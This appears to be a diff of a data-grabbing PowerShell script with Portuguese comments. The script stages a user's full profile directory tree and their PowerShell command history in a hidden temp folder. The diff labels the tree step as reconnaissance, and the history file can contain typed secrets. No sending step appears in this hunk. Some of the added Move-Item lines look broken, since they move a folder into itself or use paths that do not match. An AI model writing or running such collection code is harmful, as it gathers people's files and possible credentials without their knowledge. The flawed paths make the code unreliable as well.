@@ -68,14 +68,20 @@ New-Item -Path $env:tmp/$FolderName -ItemType Directory
 # Reconhecimento de todos os diretórios do utilizador
 tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\tree.txt
 
-# Histórico da PowerShell
+#Cria a pasta "Tree-do-PC"
+New-Item -ItemType Directory -Path "$env:TEMP\$FolderName\Tree-do-PC"
+
+#Move o ficheiro para o sitio correto
+Move-Item -Path "$env:TMP\$FolderName\Tree-do-PC" -Destination "$env:TEMP\$FolderName\Tree-do-PC\tree.txt"
+
+# Histórico da PowerShell "cria o ficheiro"
 Copy-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -Destination  $env:TEMP\$FolderName\Powershell-History.txt
 
 #Cria a pasta "Histórico-Powershell"
 New-Item -ItemType Directory -Path "$env:TEMP\$FolderName\Histórico-Powershell"
 
 #Move o ficheiro para o sitio correto
-Move-Item -Path "$env:TMP\$FolderName\Powershell-History" -Destination "$env:TEMP\$FolderName\Histórico-Powershell\Powershell-History"
+Move-Item -Path "$env:TMP\$FolderName\Histórico-Powershell" -Destination "$env:TEMP\$FolderName\Histórico-Powershell\Powershell-History.txt"
 
 ############################################################################################################################################################
 
